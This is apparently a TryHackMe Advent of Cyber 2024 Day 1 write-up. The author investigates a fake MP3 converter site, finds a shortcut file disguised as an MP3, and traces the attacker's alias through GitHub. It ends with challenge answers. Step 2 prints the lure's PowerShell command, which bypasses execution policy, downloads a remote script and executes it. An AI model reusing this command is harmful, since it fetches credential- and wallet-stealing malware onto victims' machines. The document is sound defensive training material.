# 🎄 TryHackMe Advent of Cyber 2024 – Day 1: OPSEC Challenge

## Objectives 🎯

Day 1 begins the **Advent of Cyber 2024** with an exciting challenge to investigate a suspicious YouTube to MP3 converter website. The focus is on:
1. Analyzing downloaded files to uncover malicious behavior.
2. Investigating embedded metadata and suspicious scripts.
3. Tracing the attacker’s digital breadcrumbs to expose their OPSEC mistakes.

## Steps 🚀

### Step 1: Investigating the Website
1. **Access the website:**  
   Hosted at `10.10.200.221`, the site appeared to be a standard YouTube to MP3 converter.
2. **Download the files:**  
   I entered a YouTube link, which downloaded a `download.zip` file containing:
   - **`song.mp3`**: A legitimate audio file.
   - **`somg.mp3`**: A suspiciously named file.

### Step 2: File Analysis Using ExifTool
- **Analyzing `song.mp3`:**  
  Running `exiftool song.mp3` revealed nothing unusual—just a standard MP3 file.
- **Analyzing `somg.mp3`:**  
  Running `exiftool somg.mp3` revealed:
  - It was a Windows Shortcut file (`.lnk`), not an MP3.
  - Metadata contained an embedded PowerShell command:
    ```
    -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
    ```
  This command bypasses PowerShell execution policies, downloads a malicious script, and executes it.

### Step 3: Opening the Embedded URL
- **Inspect the URL:**  
  The URL hosted a PowerShell script designed to steal:
  - Cryptocurrency wallet files.
  - Browser credentials.
- **C2 Server:**  
  Stolen data was sent to a Command and Control (C2) server controlled by the attacker.

### Step 4: Tracing the Attacker on GitHub
- **Signature in Script:**  
  The script contained the signature:
  ```
  "Created by the one and only M.M."
  ```
- **Search Results:**  
  Searching GitHub for `"Created by the one and only M.M."` led to:
  - A repository owned by **M.M.**
  - Comments tying their account to malicious activity.

## Key Findings 🔑

1. **Legitimate File:** `song.mp3` was harmless.
2. **Malicious File:** `somg.mp3` contained a PowerShell command to execute a malicious script.
3. **C2 Server:** The attacker’s script sent stolen data to a remote server.
4. **Attacker Identity:** Poor OPSEC practices on GitHub exposed "M.M."

## Lessons Learned 🌟

### OPSEC Failures
1. **Reused Aliases:**  
   The attacker used the same alias ("M.M.") across platforms, making them easier to track.
2. **Identifiable Metadata:**  
   Including a signature in the script created a direct link to their identity.
3. **Public Interactions:**  
   GitHub comments connected their profile to the malicious activity.

### Tools and Techniques 🛠️
1. [ExifTool](https://exiftool.org/) – Extracted metadata to uncover the embedded PowerShell command.
2. **Browser Inspection:** Investigated URLs to find malicious scripts.
3. [GitHub Search](https://github.com/) – Traced the attacker through their digital breadcrumbs.

## Final Thoughts 🎁

Day 1 was an excellent introduction to metadata analysis and attacker investigation. Tracking down M.M. using GitHub highlighted how OPSEC failures can leave attackers exposed. This challenge provided a perfect mix of technical analysis and detective work to kick off the Advent of Cyber!

### Answers ✅
1. **What file was harmless?**  
   **Answer:** `song.mp3`
2. **What was the embedded PowerShell command used for?**  
   **Answer:** Bypassed execution policies, downloaded a malicious script, and executed it.
3. **What is the attacker’s alias?**  
   **Answer:** `M.M.`
